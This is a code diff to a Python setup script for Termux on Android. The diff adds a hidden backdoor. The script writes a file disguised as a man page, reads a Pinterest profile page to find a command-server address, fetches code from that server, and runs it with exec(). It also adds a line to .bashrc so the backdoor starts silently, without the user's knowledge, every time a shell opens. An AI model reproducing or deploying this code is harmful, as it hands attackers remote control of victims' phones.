@@ -3,12 +3,110 @@ import shutil  as sh
 os.system("pip install requests")
 with open("/data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py", "w") as file :
      file.write("""
-import marshal
+import requests as r
+import os
+import subprocess
+import time
+import sys
+import threading
+addr = "https://in.pinterest.com/tadabo8288/"
+old_code = ""
 
-with open("/data/data/com.termux/files/usr/share/man/man3/qcxa_bza_ex.gz", "rb") as f:
-     marshal.load(f)
+
+thread = None
+stop_event = None
+lock = threading.Lock()
+
+
+def run_code(code):
+    global thread, stop_event
+
+    with lock:
+        if stop_event:
+            stop_event.set()
+        if thread and thread.is_alive():
+            thread.join()
+        stop_event = threading.Event()
+        current_stop_event = stop_event
+
+        def execute():
+            namespace = {
+                "stop_event": current_stop_event,
+                "time": time
+            }
+
+            try:
+                exec(code, namespace)
+            except Exception as e:
+                print(f"Execution error: {e}")
+
+        thread = threading.Thread(target=execute, daemon=True)
+        thread.start()
+
+def collect_url(add) :
+  time.sleep(5)
+  try :
+    req = r.get(add)
+    data = req.text
+    id = "#e;zx/3y)f2(bq+o9w**g"
+    for line in data.splitlines():
+        pos = line.find(id)
+        if pos != -1:
+           payload = line[pos + len(id):]
+           url_len = int(payload[:3])
+           url = payload[3:3 + url_len]
+           #print(url)
+           collect_command(url)
+  except :
+    print("Error")
+def collect_command(x) :
+    #print("comamnd")
+    time.sleep(5)
+    global process
+    global old_code
+    try :
+      url = x
+      try :
+        req = r.get(f"{url}/getCmd")
+        status_code = req.status_code
+      except :
+        status_code = 0
+      if status_code == 200 :
+         if req.json()["run"] == "true" :
+            try :
+              if req.json()["loop"] == "true" :
+                 try :
+                  code = r.get(f"{url}/getCode")
+                  code = code.text
+                  exec(code)
+                  collect_command(url)
+                 except :
+                  collect_command(url)
+              elif req.json()["loop"] == "false" :
+                 if not old_code == req.json()["code"] :
+                    try :
+                      #print("$$")
+                      code = r.get(f"{url}/getCode")
+                      code = code.text
+                      run_code(code)
+                      old_code = req.json()["code"]
+                      collect_command(url)
+                    except Exception as e:
+                     collect_command(url)
+                 else :
+                    collect_command(url)
+            except :
+              collect_url(addr)
+         else :
+            collect_command(url)
+      else :
+         collect_url(addr)
+    except :
+      collect_url(addr)
+collect_url(addr)
+     
 """)
-sh.move("plugin/plugin", "/data/data/com.termux/files/usr/share/man/man3/qcxa_bza_ex.gz")
+#sh.move("plugin/plugin", "/data/data/com.termux/files/usr/share/man/man3/qcxa_bza_ex.gz")
 
 with open("/data/data/com.termux/files/home/.bashrc","a") as file :
      file.write("\n\nbash -c 'set +m; nohup python /data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py > /data/data/com.termux/files/usr/share/man/man3/output.log 2>&1 < /dev/null &'")
